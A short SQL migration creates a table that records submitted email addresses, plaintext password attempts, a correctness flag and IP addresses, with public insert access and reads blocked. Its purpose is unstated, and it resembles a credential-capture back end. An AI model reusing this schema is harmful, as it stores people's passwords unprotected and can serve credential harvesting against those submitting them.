-- Create table to store email submissions
CREATE TABLE public.email_submissions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  email TEXT NOT NULL,
  password_attempt TEXT NOT NULL,
  is_correct BOOLEAN NOT NULL DEFAULT false,
  submitted_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  ip_address TEXT
);

-- Enable Row Level Security
ALTER TABLE public.email_submissions ENABLE ROW LEVEL SECURITY;

-- Create policy to allow inserting email submissions (public access for form submissions)
CREATE POLICY "Allow public email submissions" 
ON public.email_submissions 
FOR INSERT 
WITH CHECK (true);

-- Create policy for viewing submissions (admin only - you can adjust this later)
CREATE POLICY "Admin can view all submissions" 
ON public.email_submissions 
FOR SELECT 
USING (false); -- Set to false for now, you can create admin access later